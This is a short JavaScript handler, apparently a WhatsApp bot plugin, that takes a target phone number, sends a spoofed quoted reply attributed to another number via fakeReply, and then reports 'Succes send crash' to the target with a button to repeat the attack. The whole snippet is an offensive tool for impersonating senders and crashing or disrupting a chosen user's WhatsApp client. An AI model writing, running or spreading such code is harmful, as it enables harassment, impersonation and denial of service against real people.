let handler = async (m, { conn, args, usedPrefix: _p, command: _c }) => {
    if (!args[0]) throw 'nonya mana banh ?'
conn.fakeReply(`${args[0]}` + '@s.whatsapp.net', 'A', '62895336282144@s.whatsapp.net', 'B', '0@broadcast')

 await conn.sendButton(m.chat, `Succes send crash to @${args[0].split("@")[0]}`, wm, 'Again', `${_p + _c + ' ' + args[0]}`, m)
}
